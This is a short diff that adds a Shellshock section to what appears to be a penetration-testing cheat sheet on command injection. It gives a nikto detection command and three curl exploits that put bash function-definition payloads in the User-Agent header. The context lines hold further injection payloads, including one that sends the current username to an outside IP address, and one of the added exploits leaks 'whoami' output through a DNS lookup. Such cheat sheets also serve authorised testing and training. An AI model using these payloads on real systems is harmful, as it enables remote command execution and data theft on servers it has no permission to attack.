@@ -315,3 +315,16 @@ curl http://192.168.0.20/$(whoami)
 ```
 (dir 2>&1 *`|echo CMD);&<# rem #>echo PowerShell
 ```
+
+## Shellshock
+-> Detection
+```
+nikto -h <IP> -C all
+```
+	
+-> Exploit
+```
+curl -A "() { ignored; }; echo Content-Type: text/plain ; echo ; echo ; /bin/bash -c 'whoami'" <IP>
+curl -A "() { :; };echo ;/bin/bash -c 'hostname'"  <IP>
+curl -A "() { :; }; /usr/bin/nslookup $(whoami).site.com" <IP>
+```
